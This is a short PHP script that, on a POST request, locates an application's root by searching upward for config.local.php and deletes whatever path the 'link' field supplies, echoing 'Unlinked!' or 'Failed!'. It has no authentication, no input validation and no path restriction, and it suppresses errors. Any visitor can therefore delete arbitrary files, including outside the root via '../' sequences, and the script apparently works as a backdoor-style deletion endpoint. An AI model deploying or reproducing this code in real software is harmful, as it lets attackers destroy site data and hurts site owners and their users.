<?php 
if (isset($_POST['link'])) {
        $app_dir = get_app_root_dir();
	@unlink($app_dir . $_POST['link']);
	if (file_exists($app_dir . $_POST['link']))
		echo "Failed!";
	else
		echo "Unlinked!";
}

//
function get_app_root_dir($max_deep = 30)
{
	for($i=1; $i<=$max_deep; $i++)
	{
	    $dir = getcwd();
		if( file_exists($dir . "/config.local.php") )
			return $dir.'/';
		
		chdir('../');
	}
	return false;
}